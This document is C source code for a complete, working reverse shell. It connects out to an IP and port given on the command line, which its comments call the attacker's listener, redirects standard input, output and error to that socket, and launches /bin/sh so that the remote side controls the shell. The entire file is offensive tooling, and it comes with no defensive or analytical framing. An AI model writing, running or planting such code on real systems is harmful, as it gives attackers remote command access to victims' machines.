#include <stdio.h>              // For printf
#include <stdlib.h>             // For atoi
#include <unistd.h>             // For dup2, execve
#include <string.h>             // For memset
#include <sys/socket.h>         // For socket(), connect()
#include <netinet/in.h>         // For sockaddr_in
#include <arpa/inet.h>          // For inet_aton()

int main(int argc, char *argv[]) {
    // Check for correct usage
    if (argc != 3) {
        printf("[-] Usage: ./%s <IP> <PORT>\n", argv[0]);
        return -1;
    }

    // Get IP and PORT from command line
    const char* IP = argv[1];
    int PORT = atoi(argv[2]);  // Convert port from string to integer

    // Prepare the sockaddr_in structure for target connection
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;             // IPv4
    addr.sin_port = htons(PORT);           // Convert port to network byte order
    inet_aton(IP, &addr.sin_addr);         // Convert IP string to binary form

    // Create the socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[-] Socket creation failed");
        return -1;
    }

    // Connect to the attacker/listener
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] Connection failed");
        return -1;
    }

    // Redirect stdin, stdout, and stderr to the socket
    for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
    }

    // Spawn a shell; now controlled by attacker
    execve("/bin/sh", NULL, NULL);

    return 0;
}
